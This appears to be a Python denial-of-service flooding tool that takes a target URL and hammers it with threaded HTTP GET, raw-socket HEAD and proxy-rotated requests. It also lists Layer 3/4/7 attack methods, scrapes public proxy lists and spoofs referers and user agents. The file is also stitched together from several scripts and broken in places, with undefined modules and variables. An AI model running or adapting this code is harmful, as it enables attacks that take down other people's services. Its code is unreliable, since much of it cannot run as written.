import threading
from threading import Thread, Timer
import requests
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
import socket, threading
from threading import Thread
import random
import time
import socket
import os
import sys

os.system("clear")

print("""
     __      ANONYMOUS       _____
    / /  __ _ _   _  ___ _  |___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/
  ADDED NEW METHOD AND BYPASS 
""")

# def
url = input(" Ссылка URL : => ")
thread = int(input(" Time : => "))


def atk_1():
    while True:
        r = requests.get(url, data="158.69.121.40:7777,158.69.121.40:7777,37.120.192.154:8080")
        print(r.status_code, "| Attack Sucess |")


executor = ThreadPoolExecutor(max_workers=int(1000000000000))


def attack():
    while True:

        a = socket(AF_INET, SOCK_STREAM)
        for _ in range(100):

            for _ in range(100):
                a.send(
                    str.encode(
                        f"HEAD {url} HTTP/2.0\r\nHost:  {str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}\r\n\r\n\r\n"
                    ))


def send2attack():
    for _ in range(2):
        for _ in range(500):
            executor.submit(attack)
    sleep(3)


def opth():
    for a in range(thr):
        x = threading.Thread(target=atk_1)
        x.start()
        print("Threads Running : " + str(a + 1))
    print("[!] Wait For Ready Threads...")
    time.sleep(20)
    input("[+] PRESS [ ENTER ] START ATTACK")
    global oo
    oo = True


oo = False


def main():
    global url
    global list
    global pprr
    global thr
    global per
    
    thr = int(input(f"[+] Threads (1-1000) : => "))
    per = int(input("[!] Req Power (1-100) : => "))
    opth()


def atk():
    pprr = open(list).readlines()
    proxy = random.choice(pprr).strip().split(":")
    s = cfscrape.create_scraper()
    s.proxies = {}
    s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
    s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
    time.sleep(10)
    while True:
        while oo:
            try:
                s.get(url)
                print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
                      ' Attack ' + str(url))
                try:
                    for g in range(per):
                        s.get(url)
                        print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
                              ' Attack ' + str(url))
                        Thread(target=atk).start()
                    #s.close()
                except:
                    s.close()
            except:
                s.close()
                print("Proxy is not response..")


if __name__ == "__main__":
    main()



l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
l3 = ["POD", "ICMP"]
to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
ot = ["STOP", "TOOLS", "HELP"]
methods = l7 + l4 + l3
methodsl = l7 + l4 + l3 + to + ot



def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)



def head(event, socks_type):
    proxy = (random).strip().split(":")
    header = head("head")
    head_host = "HEAD " + path + "?" + random() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < Timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            
            try:
                for _ in range(threading):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def downloadsocks(choice):
    global out_file
    if choice == "4":
        f = open( target, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
        



url=''                                                                                              
host=''                                                                                             
headers_useragents=[]                                                                               
headers_referers=[]                                                                                 
request_counter=0                                                                                   
flag=0                                                                                             
safe=0                                                                                              

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
#pp py
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

#pp botnet 

def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.google.com/?q=')                                      
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.bing.com/search?q=')                                  
	headers_referers.append('http://search.yahoo.com/search?p=')                              
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
	headers_referers.append('http://evoec.com/review/redirect.php?url=')
	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
	headers_referers.append('http://apke.ru/redirect.php?url=')
	headers_referers.append('http://seodrum.com/redirect.php?url=')
	headers_referers.append('http://redrool.com/redirect.php?url=')
	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
	headers_referers.append('http://searchtoday.info/redirect.php?url=')
	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
	headers_referers.append('http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=')
	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
	headers_referers.append('http://www.e39-forum.de/redir.php?url=')
	headers_referers.append('http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=')
	headers_referers.append('http://www.selectsmart.com/plus/select.php?url=')
	headers_referers.append('http://www.taichinh2a.com/forum/links.php?url=')
	headers_referers.append('http://facenama.com/go.php?url=')
	headers_referers.append('http://www.internet-abc.de/eltern/118732.php?url=')
	headers_referers.append('http://g.makebd.com/index.php?url=')
	headers_referers.append('https://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.mientay24h.vn/redirector.php?url=')
	headers_referers.append('http://www.kapook.com/webout.php?url=')
	headers_referers.append('http://lue4.ddns.name/pk/index.php?url=')
	headers_referers.append('http://747.ddns.ms/pk/index.php?url=')
	headers_referers.append('http://737.ddns.us/pk/index.php?url=')
	headers_referers.append('http://a30.m1.4irc.com/pk/index.php?url=')








for i in range(thread):
    threading.Thread(target=atk_1).start()
